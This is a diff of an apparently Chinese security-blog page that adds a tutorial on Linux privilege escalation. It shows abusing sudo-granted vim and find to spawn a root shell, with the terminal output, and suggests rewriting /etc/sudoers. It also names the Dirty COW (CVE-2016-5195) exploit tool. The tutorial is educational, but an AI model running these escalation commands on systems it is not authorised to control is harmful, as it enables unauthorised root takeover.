@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">3.6k</span>
+            <span class="post-count">4k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">15 分钟</span>
+            <span class="post-count">16 分钟</span>
         </span>
     </span>
 </div>
@@ -329,6 +329,24 @@
 <p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#4-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83">mysql提权方法整理</a></p>
 <h1 id="2-3linux提权"><a href="#2-3linux提权" class="headerlink" title="2.3linux提权"></a>2.3linux提权</h1><p>Suid提权：普通用户去执行 root 权限的操作，而不需要知道 root 的密码</p>
 <p>第三方软件提权</p>
+<h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><strong>借助到可以执行系统指令的交互式功能。</strong>就是分配给的权限太高导致的</p>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>已知，普通用户xg有了个 <strong>vim权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">100 root    ALL=(ALL)       ALL</span><br><span class="line">101 xg      ALL=(ALL)       /bin/systemctl,/usr/bin/vim</span><br></pre></td></tr></table></figure>
+
+<p>好，在xg用户下，<code>sudo vim /etc/sudoers</code></p>
+<p>把101行的第三列替换成ALL，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[xg@xinguang /]$ sudo vim 1.txt</span><br><span class="line">[sudo] password <span class="keyword">for</span> xg:</span><br><span class="line">[xg@xinguang /]$ ll</span><br><span class="line">total 32</span><br><span class="line">-rw-r--r--.   1 root root  370 Sep 21 16:04 1.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[xg@xinguang /]$ sudo vim 1.txt</span><br><span class="line"></span><br><span class="line">(我在1.txt里面左下角那个冒号那里啊，输入了</span><br><span class="line">!<span class="built_in">touch</span> 5.txt，回车后再保存退出即可</span><br><span class="line">)</span><br><span class="line">Press ENTER or <span class="built_in">type</span> <span class="built_in">command</span> to <span class="built_in">continue</span></span><br><span class="line">[xg@xinguang /]$ ll</span><br><span class="line">total 32</span><br><span class="line">-rw-r--r--.   1 root root  370 Sep 21 16:05 1.txt</span><br><span class="line">-rw-r--r--.   1 root root    0 Sep 21 16:05 5.txt</span><br><span class="line">//看，多了个5.txt，还是root的</span><br><span class="line"></span><br><span class="line">继续</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[xg@xinguang /]$ <span class="built_in">id</span></span><br><span class="line">uid=1000(xg) gid=1000(xg) <span class="built_in">groups</span>=1000(xg) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br><span class="line">[xg@xinguang /]$ sudo vim 1.txt</span><br><span class="line"></span><br><span class="line">左下角这样：:!/bin/bash</span><br><span class="line">回车</span><br><span class="line"></span><br><span class="line">[root@xinguang /]<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过vim权限拿到bin&#x2F;bash，问你怕不怕，直接进入root用户操作终端</p>
+<p>还有 <code>find、awk</code>，但凡可以执行系统指令，都可以进到root终端哈</p>
+<p><strong>find</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[xg@xinguang /]$ sudo find /home -<span class="built_in">exec</span> bash \;</span><br><span class="line">[sudo] password <span class="keyword">for</span> xg:</span><br><span class="line">[root@xinguang /]<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>linux内核的内存子系统，在处理写入时复制时产生了竞争条件；该漏洞将只读内存映射进行写访问</p>
+<h4 id="无实例"><a href="#无实例" class="headerlink" title="无实例"></a>无实例</h4><p>有现成的CVE-2016-5195工具嘞，解压到里面，dcow运行下就行了。</p>
+<h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><p>升级系统或提高gcc版本</p>
  
       <!-- reward -->
       
@@ -406,11 +424,11 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/07/01/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/" class="article-nav-link">
+      <a href="/2023/07/01/%E5%AE%9E%E6%88%98/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            安全产品
+            实战记录
           
         </div>
       </a>
